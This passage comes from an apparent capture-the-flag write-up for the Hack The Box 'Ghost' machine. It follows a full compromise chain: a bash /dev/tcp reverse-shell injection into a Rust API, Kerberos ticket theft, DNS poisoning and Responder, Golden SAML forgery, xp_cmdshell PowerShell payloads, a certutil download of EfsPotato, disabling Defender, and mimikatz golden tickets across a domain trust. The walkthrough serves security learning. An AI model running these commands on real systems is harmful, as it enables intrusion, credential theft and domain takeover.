+<span class="nv">We</span><span class="w"> </span><span class="nv">are</span><span class="w"> </span><span class="nv">adding</span><span class="w"> </span><span class="nv">new</span><span class="w"> </span><span class="nv">features</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">integrate</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">blog</span><span class="w"> </span><span class="nv">and</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">intranet</span>.<span class="w"> </span><span class="nv">See</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">blog</span><span class="w"> </span><span class="nv">repo</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">more</span><span class="w"> </span><span class="nv">details</span>.<span class="w">  </span>
+
+<span class="k">Until</span><span class="w"> </span><span class="nv">development</span><span class="w"> </span><span class="nv">is</span><span class="w"> </span><span class="nv">done</span>,<span class="w"> </span><span class="nv">we</span><span class="w"> </span><span class="nv">will</span><span class="w"> </span><span class="nv">expose</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">dev</span><span class="w"> </span><span class="nv">API</span><span class="w"> </span><span class="nv">at</span><span class="w"> </span><span class="nv">http</span>:<span class="o">//</span><span class="nv">intranet</span>.<span class="nv">ghost</span>.<span class="nv">htb</span><span class="o">/</span><span class="nv">api</span><span class="o">-</span><span class="nv">dev</span>.
+</code></pre></div>
+
+<p>Since I've obtained the DEV_INTRANET_KEY, I suspect it will grant me access to the /api-dev endpoint. If so, this could allow interaction with internal scripts or restricted functionality.</p>
+<p>After digging deeper into the intranet repository, I found an interesting Rust script named scan.rs, located inside backend/src/api/dev/.</p>
+<div class="codehilite"><pre><span></span><code><span class="err">###</span><span class="w"> </span><span class="nx">Code</span><span class="w"> </span><span class="nx">snippet</span>
+
+<span class="c1">// Scans a URL inside a blog post</span>
+<span class="c1">// This will be called by the blog to ensure all URLs in posts are safe</span>
+<span class="err">#</span><span class="p">[</span><span class="nx">post</span><span class="p">(</span><span class="s">&quot;/scan&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">format</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;json&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="s">&quot;&lt;data&gt;&quot;</span><span class="p">)]</span>
+<span class="nx">pub</span><span class="w"> </span><span class="kd">fn</span><span class="w"> </span><span class="nx">scan</span><span class="p">(</span><span class="nx">_guard</span><span class="p">:</span><span class="w"> </span><span class="nx">DevGuard</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">:</span><span class="w"> </span><span class="nx">Json</span><span class="p">&lt;</span><span class="nx">ScanRequest</span><span class="p">&gt;)</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="nx">Json</span><span class="p">&lt;</span><span class="nx">ScanResponse</span><span class="p">&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// currently intranet_url_check is not implemented,</span>
+<span class="w">    </span><span class="c1">// but the route exists for future compatibility with the blog</span>
+<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">Command</span><span class="o">::</span><span class="nx">new</span><span class="p">(</span><span class="s">&quot;bash&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">arg</span><span class="p">(</span><span class="s">&quot;-c&quot;</span><span class="p">)</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">arg</span><span class="p">(</span><span class="nx">format</span><span class="p">!(</span><span class="s">&quot;intranet_url_check {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">url</span><span class="p">))</span>
+<span class="w">        </span><span class="p">.</span><span class="nx">output</span><span class="p">();</span>
+</code></pre></div>
+
+<p>The script constructs a Bash command using data.url, a user-controlled parameter.
+Since the input is passed directly into a shell command without sanitization, I may be able to inject a reverse shell one-liner as data.url, gaining remote access to the system.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="n">intranet</span><span class="p">.</span><span class="n">ghost</span><span class="p">.</span><span class="nl">htb</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">api</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">scan</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">&#39;X-DEV-INTRANET-KEY: !@yqr!X2kxmQ.@Xe&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;{&quot;url&quot;: &quot;0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/10.10.16.92/9001; /bin/bash &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196&quot;}&#39;</span>
+</code></pre></div>
+
+<p><img alt="revshell" src="../images/Ghost/revshell.png" /></p>
+<p>Reverse shell worked! I am... Root? This is most likely a docker container then.</p>
+<p>In the initial folder, there in an sqlite database and an ELF binary. I'll get them onto my machine for further analysis.</p>
+<p>The database does not contain any interesting data. I'll analyze the ELF bin with radare2.</p>
+<p>While waiting for radare2 to analyze the file, I went forward and explored the container a bit more.</p>
+<h2>Getting access to the dev workstation</h2>
+<p>In the root directory, I found a docker-entrypoint.sh file:</p>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/bin/bash</span>
+
+mkdir<span class="w"> </span>/root/.ssh
+mkdir<span class="w"> </span>/root/.ssh/controlmaster
+<span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;Host *\n  ControlMaster auto\n  ControlPath ~/.ssh/controlmaster/%%r@%%h:%%p\n  ControlPersist yes&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/root/.ssh/config
+
+<span class="nb">exec</span><span class="w"> </span>/app/ghost_intranet
+</code></pre></div>
+
+<p>And here are the contents of the controlmaster file:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">florence</span><span class="p">.</span><span class="n">ramirez</span><span class="nv">@ghost</span><span class="p">.</span><span class="n">htb</span><span class="nv">@dev</span><span class="o">-</span><span class="nl">workstation</span><span class="p">:</span><span class="mi">22</span>
+</code></pre></div>
+
+<p>I'll try to SSH onto the dev workstation as Florence.</p>
+<h2>Getting a kerberos ticket as florence.ramirez</h2>
+<p><img alt="shell" src="../images/Ghost/shell.png" /></p>
+<p>There is nothing on this workstation... But Im Florence. Perhaps there is something that could allow me to authenticate as them? </p>
+<p><img alt="klist" src="../images/Ghost/klist.png" /></p>
+<p>There is a valid kerberos ticket! I'll copy it over to my box so that I can move forward as florence.ramirez.</p>
+<p><img alt="base64ticket" src="../images/Ghost/base64ticket.png" /></p>
+<p>I base64 encoded the ticket in order to copy it to my machine easily. On my machine, I decoded it and saved it to a file.</p>
+<p><img alt="kirbiticket" src="../images/Ghost/kirbiticket.png" /></p>
+<p>The ticket is valid. I can now authenticate as florence.ramirez!</p>
+<p><img alt="bloodhoundpy" src="../images/Ghost/bloodhoundpy.png" /></p>
+<p>In bloodhound, I see two interesting things:</p>
+<p><img alt="bidirectional_trust" src="../images/Ghost/bidirectional_trust.png" /></p>
+<p>There are actually two domains. Ghost and corp.ghost are trusted by eachother. If I compromise one domain, I might be able to get ahold of the other by abusing their trust.</p>
+<p><img alt="gmsaread" src="../images/Ghost/gmsaread.png" /></p>
+<p>Justin Bradley can read the GMSA password of the ADFS$ account. If I can get Justin's credentials, a new attack path will open for me.</p>
+<h2>DNS Poisoning as florence.ramirez</h2>
+<p>With Florence Ramirez, I might be able to realize my earlier plan to poison the DNS records and get Justin's hash. I'll try that right now using a tool called "dnstool".</p>
+<div class="codehilite"><pre><span></span><code><span class="n">python</span><span class="w"> </span><span class="n">krbrelayx</span><span class="o">/</span><span class="n">dnstool</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;ghost.htb</span><span class="se">\f</span><span class="s1">lorence.ramirez&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">k</span><span class="w"> </span><span class="o">--</span><span class="n">record</span><span class="w"> </span><span class="s1">&#39;bitbucket.ghost.htb&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">dns</span><span class="o">-</span><span class="n">ip</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">11.24</span><span class="w"> </span><span class="o">--</span><span class="n">data</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">16.92</span><span class="w"> </span><span class="o">--</span><span class="n">action</span><span class="w"> </span><span class="n">add</span><span class="w"> </span><span class="n">DC01</span><span class="o">.</span><span class="n">ghost</span><span class="o">.</span><span class="n">htb</span>
+</code></pre></div>
+
+<p><img alt="dnspoison" src="../images/Ghost/dnspoison.png" /></p>
+<p>Now I'll start responder as root, listening on the proper interface.</p>
+<div class="codehilite"><pre><span></span><code>sudo responder -I tun0
+</code></pre></div>
+
+<p>After a few seconds, I already have the NTLMv2 hash.</p>
+<p><img alt="responder" src="../images/Ghost/responder.png" /></p>
+<p>I'll crack it with hashcat.</p>
+<p><img alt="crackedhash" src="../images/Ghost/crackedhash.png" /></p>
+<p>It cracked! Since Justin Bradley can remote into the machine(seen via bloodhound), I'll do just that before proceeding with my further plans. I'll see if the user flag is acquirable at this point.</p>
+<p><img alt="evilwinrm" src="../images/Ghost/evilwinrm.png" /></p>
+<p>User flag captured!</p>
+<h1>Root Flag</h1>
+<p>Using netexec, I can acquire the hash of ADFS_GMSA$.</p>
+<p><img alt="nxc" src="../images/Ghost/nxc.png" /></p>
+<p>This account can be used to perform a golden SAML attack, which will allow me to break through the login page at federation.ghost.htb.</p>
+<h2>Golden SAML attack</h2>
+<p>I built ADFSDump on a Windows 10 VM and sent it back to my kali box to use it in the attack and extract the ADFS secrets.</p>
+<p><img alt="adfsdump" src="../images/Ghost/adfsdump.png" /></p>
+<p>I got the necessary keys, now I need to convert them into the right formats.</p>
+<p><img alt="files" src="../images/Ghost/files.png" /></p>
+<p>I'll use ADFSpoof to forge a golden SAML response.</p>
+<p>After a long fight with python, dependencies and the cryptography package, I finally managed to make ADFSpoof work.</p>
+<p><img alt="adfspoof" src="../images/Ghost/adfspoof.png" /></p>
+<p>With the SAML response in hand, I should be able to enter the federated website as administrator. I will first login as Justin Bradley, then  I'll manipulate the request in burpsuite and swap the original SAML Response with my forged one.</p>
+<p><img alt="swap" src="../images/Ghost/swap.png" /></p>
+<h2>Shell as MSSQL-Service</h2>
+<p>On the website, there is an SQL debug panel.</p>
+<p><img alt="sqlpanel" src="../images/Ghost/sqlpanel.png" /></p>
+<p>There's not much I can do, as my user is a low privileged one.</p>
+<p>However, I've stumbled upon an interesting thing during my search.</p>
+<div class="codehilite"><pre><span></span><code>#SQL query: SELECT srvname, isremote from syservers
+
+{
+    &quot;recordsets&quot;: [
+        [
+            {
+                &quot;srvname&quot;: &quot;DC01&quot;,
+                &quot;isremote&quot;: true
+            },
+            {
+                &quot;srvname&quot;: &quot;PRIMARY&quot;,
+                &quot;isremote&quot;: false
+            }
+        ]
+    ],
+</code></pre></div>
+
+<p>There is a primary server as well. I'll try to find a way to exploit this.</p>
+<div class="codehilite"><pre><span></span><code><span class="n">#SQL</span><span class="w"> </span><span class="nl">query</span><span class="p">:</span><span class="w"> </span><span class="k">EXECUTE</span><span class="p">(</span><span class="s1">&#39;EXECUTE AS LOGIN = &#39;&#39;sa&#39;&#39;; EXEC sp_configure &#39;&#39;show advanced options&#39;&#39;&#39;</span><span class="p">)</span><span class="w"> </span><span class="k">AT</span><span class="w"> </span><span class="o">[</span><span class="n">PRIMARY</span><span class="o">]</span>
+
+<span class="err">{</span>
+<span class="w">    </span><span class="ss">&quot;recordsets&quot;</span><span class="err">:</span><span class="w"> </span><span class="o">[</span>
+<span class="n">        [</span>
+<span class="n">            {</span>
+<span class="n">                &quot;name&quot;: &quot;show advanced options&quot;,</span>
+<span class="n">                &quot;minimum&quot;: 0,</span>
+<span class="n">                &quot;maximum&quot;: 1,</span>
+<span class="n">                &quot;config_value&quot;: 1,</span>
+<span class="n">                &quot;run_value&quot;: 1</span>
+<span class="n">            }</span>
+<span class="n">        </span><span class="o">]</span>
+<span class="w">    </span><span class="err">]</span><span class="p">,</span>
+</code></pre></div>
+
+<p>I can execute commands on the primary server! I'll refine the command to achieve just that.</p>
+<p>But before that, I'll do some preparation. For my reverse shell, I'll be using PowerJoker. A python script with great obfuscation and multiple sessions management.</p>
+<p><code>https://github.com/Adkali/PowerJoker</code></p>
+<p><img alt="PJ" src="../images/Ghost/PJ.png" /></p>
+<p>I'll put the generated payload as the command to execute with my xp_cmdshell query.</p>
+<p><code>SQL query: EXECUTE('EXECUTE AS LOGIN = ''sa''; EXEC sp_configure ''show advanced options'', 1; RECONFIGURE; EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE; EXEC xp_cmdshell ''powershell -e "encoded command''') AT [PRIMARY]</code></p>
+<p><img alt="PJmssql" src="../images/Ghost/PJmssql.png" /></p>
+<h2>MSSQL-Service to system</h2>
+<p>I've landed in the corp.ghost.htb domain.</p>
+<p>I'll check the privileges of the mssql-service user.</p>
+<p><img alt="impersonate" src="../images/Ghost/impersonate.png" /></p>
+<p>'SeImpersonatePrivilege' is enabled here. I can use one of the potato exploits to elevate privileges!</p>
+<p>Some of the potatos did not work, but I've found one that worked for me. I'll download EfsPotato onto my box, then I'll use certutil to download it onto the target.</p>
+<p><code>https://github.com/zcgonvh/EfsPotato</code></p>
+<p>I started a python server on my machine and downloaded EfsPotato onto the target machine.</p>
+<div class="codehilite"><pre><span></span><code>certutil -urlcache -split -f http://10.10.16.93/EfsPotato.cs
+</code></pre></div>
+
+<p><img alt="potato" src="../images/Ghost/potato.png" /></p>
+<p>Before building the .exe, I'll check the .net framework version thats present on the box, so that I can provide the correct one.</p>
+<p><img alt="netver" src="../images/Ghost/netver.png" /></p>
+<p>I'll build EfsPotato.exe using the latest available version.</p>
+<div class="codehilite"><pre><span></span><code>C:\Windows\Microsoft.Net\Framework\V4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
+</code></pre></div>
+
+<p><img alt="potatobuild" src="../images/Ghost/potatobuild.png" /></p>
+<p>And I'll run it with the same powershell command.</p>
+<div class="codehilite"><pre><span></span><code>.\EfsPotato.exe &#39;Powershell command&#39;
+</code></pre></div>
+
+<p>With PowerJoker I am able to receive the 2nd connection without changing commands and switch between them easily.</p>
+<p><img alt="system" src="../images/Ghost/system.png" /></p>
+<p>With system-level permissions, I can disable the annoying defender for good. This'll also allow me to get easy shells from the MSSQL panel without obfuscation.</p>
+<div class="codehilite"><pre><span></span><code>Set-MpPreference -DisableRealtimeMonitoring $True
+</code></pre></div>
+
+<h2>Bidirectional Trust Relationship Abuse</h2>
+<p>Thanks to the trust between the domains, I'll be able to create a golden ticket with mimikatz, then I'll use rubeus to get access to the DC's filesystem, where the root flag should be.</p>
+<div class="codehilite"><pre><span></span><code>.\<span class="nv">mimikatz</span>.<span class="nv">exe</span><span class="w"> </span><span class="s1">&#39;lsadump::trust /patch&#39;</span><span class="w"> </span><span class="k">exit</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nv">Extracts</span><span class="w"> </span><span class="nv">trust</span><span class="w"> </span><span class="nv">keys</span><span class="w"> </span><span class="nv">that</span><span class="w"> </span><span class="nv">are</span><span class="w"> </span><span class="nv">used</span><span class="w"> </span><span class="nv">to</span><span class="w"> </span><span class="nv">authenticate</span><span class="w"> </span><span class="nv">between</span><span class="w"> </span><span class="nv">domains</span><span class="w"> </span><span class="nv">in</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">trust</span><span class="w"> </span><span class="nv">relationship</span>,<span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="nv">exits</span><span class="ss">(</span><span class="nv">otherwise</span><span class="w"> </span><span class="nv">it</span><span class="w"> </span><span class="nv">would</span><span class="w"> </span><span class="nv">just</span><span class="w"> </span><span class="nv">hang</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nv">me</span><span class="ss">)</span>
+</code></pre></div>
+
+<p><img alt="trustkey" src="../images/Ghost/trustkey.png" /></p>
+<p>Now I'll create the golden ticket, using all the information I've gathered before.</p>
+<div class="codehilite"><pre><span></span><code>.\mimikatz.exe &#39;kerberos::golden /domain:corp.ghost.htb /sid:S-1-5-21-2034262909-2733679486-179904498 /sids:S-1-5-21-4084500788-938703357-3654145966-519 /AES256:e3df710b4a178f726b0f74f2bfef5fbc356bb5cce7ddd50630a1589dee72426d /user:Administrator /service:krbtgt /target:ghost.htb /ticket:trusted.kirbi&#39;
+
+Generates a ticket, which will grant Enterprise Administrator privileges on the target domain.
+</code></pre></div>
+
+<p><img alt="goldenticket" src="../images/Ghost/goldenticket.png" /></p>
+<p>With this ticket in hand, I can use rubeus to gain access to the DC!</p>
+<div class="codehilite"><pre><span></span><code>.\Rubeus.exe asktgs /dc:dc01.ghost.htb /service:cifs/dc01.ghost.htb /ticket:trusted.kirbi /nowrap /ptt - Grants access to the DC filesystem, injecting the ticket into memory.
+</code></pre></div>
+
+<p><img alt="rubeus" src="../images/Ghost/rubeus.png" /></p>
+<p>At this point I can easily access the root flag located on the DC.</p>
+<p><img alt="root" src="../images/Ghost/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
